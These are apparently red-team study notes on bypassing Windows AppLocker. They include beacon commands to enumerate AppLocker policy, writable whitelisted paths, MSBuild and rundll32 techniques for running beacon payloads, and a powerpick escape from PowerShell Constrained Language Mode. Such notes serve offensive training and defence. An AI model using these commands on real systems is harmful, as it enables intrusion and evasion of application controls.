# Applocker

# Enumerate the Applocker policy via GPO

    beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

    beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol

    PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

# Enumerate the Applocker policy via Local Windows registry on machine 

    PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"

    PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

# Using powershell on local system

    PS C:\Users\Administrator> $ExecutionContext.SessionState.LanguageMode
    ConstrainedLanguage

# Navigating Laterally via PSEXEC is fine, as service binary is uploaded in C:\Winodws path which is by default whitelisted

# Find the writable path within C:\winodws to bypass Applocker

    beacon> powershell Get-Acl C:\Windows\Tasks | fl

LOLBAS
# Use MSBuild to execute C# code from a .csproj or .xml file
# Host http_x64.xprocess.bin via Site Management > Host File
# Start execution using C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe applocker_bypass.csproj

# break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace

    beacon> powershell $ExecutionContext.SessionState.LanguageMode
    ConstrainedLanguage

    beacon> powerpick $ExecutionContext.SessionState.LanguageMode
    FullLanguage

# Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)

    C:\Windows\System32\rundll32.exe http_x64.dll,StartW
